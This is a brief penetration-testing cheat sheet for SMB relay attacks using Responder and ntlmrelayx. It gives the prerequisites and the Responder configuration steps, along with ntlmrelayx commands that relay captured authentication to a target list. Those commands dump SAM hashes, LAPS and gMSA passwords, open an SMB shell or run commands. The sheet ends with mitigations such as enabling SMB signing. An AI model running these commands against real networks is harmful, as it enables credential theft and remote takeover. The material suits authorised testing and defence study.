# smb relay ntlmrelayx

**REQUIREMENTS:**

* SMB signing must be disabled.
* Relayed user creds must be admin on machine

## Information

Invoke this attack: request callback to SMB on kali using `\\IP`

1. `responder` will capture the request, pass it to `ntlmrelayx`
2. ntlmrelayx will relay the request to TARGET.txt
    1. Enables RemoteRegistry
        1. Captures system bootkey
        2. Performs intended action; Default action: SAM dump using `secretsdump.py`
        3. Retores RemoteRegistry back to disabled state.

```bash
ntlmrelayx.py [-t TARGET | -tf TARGET_FILE] -smb2support [-i] [-e "SHELL.exe"] [-c "COMMANDS"]
# -i: will open a smb shell, can connect using nc IP PORT
# --dump-laps: dump LAPS passwords
# --dump-gmsa: dump gMSA passwords

```

## SMB-check

```bash
nmap --script=smb2-security-mode.nse -p 445 IP/CIDR
```

## Method:

1. set `SMB=Off` and `HTTP=Off` in `/etc/responder/Responder.conf`
2. Run `sudo responder -I INTF -rdwv`
3. Run `ntlmrelayx.py -tf TARGET.txt -smb2support [FLAGS]`

## Fix

* Enable SMB signing on all devices (can cause performance issues).
* Disable NTLM Auth on network
* Account tiering (restricting domain admins to specific tasks)